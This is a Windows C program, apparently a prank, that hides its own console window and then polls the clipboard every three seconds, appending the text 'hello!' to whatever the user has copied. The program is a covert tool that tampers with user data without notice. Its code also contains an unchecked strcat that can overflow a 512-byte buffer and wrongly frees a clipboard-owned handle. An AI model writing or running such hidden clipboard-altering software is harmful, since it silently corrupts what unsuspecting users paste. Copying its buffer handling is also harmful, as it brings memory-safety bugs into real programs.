#include "stdio.h"

#include "windows.h"



//将字符串放到剪切板

int AppendBufferToClipboard( char *cBuffer, int nSize )

{

	HGLOBAL hClipboard = NULL;

	char *pClipBuf = NULL;



	if( OpenClipboard( NULL ) )

	{ 

		hClipboard = GlobalAlloc( GMEM_DDESHARE, nSize+1 );

		pClipBuf = (char*)GlobalLock(hClipboard);

		memset( pClipBuf, 0, nSize+1 );

		memcpy( pClipBuf, cBuffer, nSize );

		GlobalUnlock( hClipboard );

		SetClipboardData( CF_TEXT, hClipboard );

		CloseClipboard();

	}

	else

	{

		return -1;

	}



	return 0;

}



//从剪切板获取字符串

int GetBufferFromClipboard( char *cBuffer, int nMaxSize )

{

	int nNeedSize = 0;

	HANDLE hClipboard = NULL;

	char *pClipBuf = NULL;



	if ( OpenClipboard( NULL ) )

	{

		hClipboard = GetClipboardData( CF_TEXT );

		nNeedSize = GlobalSize( hClipboard );

		if ( nNeedSize > nMaxSize+1 )

		{

			return -1;

		}



		pClipBuf = (char*)GlobalLock( hClipboard );

		memset( cBuffer, 0, nMaxSize );

		memcpy( cBuffer, pClipBuf, nNeedSize );

		GlobalUnlock( hClipboard );

		CloseClipboard();



		return nNeedSize;



	}

	else

	{

		return 0;

	}



	return -1;

}



//清空剪切板

int ClearClipboradBuffer()

{

	HGLOBAL hClipboard = NULL;



	if( OpenClipboard( NULL ) )

	{ 

		hClipboard = GetClipboardData( CF_TEXT );

		GlobalFree( hClipboard );

		EmptyClipboard();

		CloseClipboard();

		return 0;

	}

	else

	{

		return -1;

	}

}



int main( int argc, char *argv[] )

{

	char cTest[ 512 ]={ 0 };	//储存参考内容

	char cClip[ 512 ] = { 0 };		//储存读取内容

	int nRet = 0;


	char joke[]="hello!";	//追加的内容


	int hwndDOS = GetForegroundWindow();
	ShowWindow(hwndDOS, SW_HIDE);


	// nRet = sprintf( cTest, "argc = %d, path = %s", argc, argv[0] );

	// printf( "%s \n", cTest );

	// ClearClipboradBuffer();



	// if( AppendBufferToClipboard( cTest, nRet ) )

	// {

	// 	printf( "Failed append buffer to clipboard. \n" );

	// 	return 0;

	// }



	// printf( "Now open notepad and press Ctrl + V to show buffer in clipboard.\n" );

	// printf( "And press any key to exit.\n" );



	// getchar();

	while(1)
	{
		Sleep(3*1000);	//暂停时间
		/********************************************************/
		//  检查剪切板数据的类型
		/********************************************************/
		if (OpenClipboard(NULL))  // 打开剪切板
		{
 			if (IsClipboardFormatAvailable(CF_TEXT)) // 检测剪切板是否有指定类型的剪切板数据
  			{
   				CloseClipboard(); // 关闭剪切板
  			}
  			else
  			{
   				CloseClipboard(); // 关闭剪切板
   				continue;
  			}
		}


		nRet = GetBufferFromClipboard( cClip, 512 );	//读取剪贴板，nRet为内容长度
	
		printf("cClip is %s\n",cClip );
		printf("cTest is %s\n", cTest);
	
		if (strcmp(cClip,cTest))		//如果读取内容和参考内容不一致进行写入
		{
			strcpy(cTest,cClip);
			strcat (cClip,joke);	//读取内容追加joke内容
			strcat (cTest,joke);	//参考内容追加joke内容
			nRet=nRet+7;	//增加长度
			printf("cClip is %s\n",cClip );
			ClearClipboradBuffer();		//清空剪贴板
			if( AppendBufferToClipboard( cClip, nRet ) )	//写入剪贴板
			{

				printf( "Failed append buffer to clipboard. \n" );	//打开剪贴板失败

				return 0;

			}
		}
	}
	

	// printf( "Get Buffer From Clipboard, nRet = %d, buf = %s \n", nRet, cClip );



	// ClearClipboradBuffer();



	// nRet = GetBufferFromClipboard( cClip, 512 );

	// printf( "Get Buffer From Clipboard again, nRet = %d, buf = %s \n", nRet, cClip );



	return 0;

}
